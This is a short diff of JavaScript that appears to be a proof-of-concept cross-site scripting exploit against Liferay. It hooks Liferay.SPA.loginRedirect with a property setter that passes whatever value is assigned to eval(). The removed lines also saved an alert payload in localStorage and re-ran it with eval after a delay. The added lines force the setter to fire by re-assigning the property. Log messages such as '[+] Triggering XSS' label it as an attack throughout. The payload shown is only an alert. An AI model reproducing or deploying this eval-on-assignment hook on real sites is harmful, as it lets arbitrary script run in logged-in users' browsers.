@@ -1,27 +1,17 @@
-// Hook into the loginRedirect assignment and auto-execute
+// Define an auto-triggering setter on Liferay.SPA.loginRedirect
 Object.defineProperty(Liferay.SPA, 'loginRedirect', {
   set: function(v) {
-    console.log('[XSS] loginRedirect set with:', v);
-    try {
-      eval(v);
-    } catch (e) {
-      console.error('[XSS Eval Error]', e);
-    }
+    console.log('[+] Triggering XSS from loginRedirect setter...');
+    eval(v);
   },
   get: function() {
-    return localStorage.getItem('xss_redirect') || '';
-  }
+    return '';
+  },
+  configurable: true
 });
 
-// Store actual payload in localStorage for re-use across pages
-localStorage.setItem('xss_redirect', `alert("🔥 XSS triggered after login!")`);
-
-// Trigger the stored payload after page load (in case it didn’t fire)
-setTimeout(() => {
-  try {
-    const stored = localStorage.getItem('xss_redirect');
-    if (stored) eval(stored);
-  } catch (e) {
-    console.error('[Fallback XSS Eval Error]', e);
-  }
-}, 2000);
+// Re-assign value to trigger the setter (if the value was set before this script ran, this won't work)
+if (Liferay.SPA.loginRedirect) {
+  const val = Liferay.SPA.loginRedirect;
+  Liferay.SPA.loginRedirect = val; // force setter to fire
+}
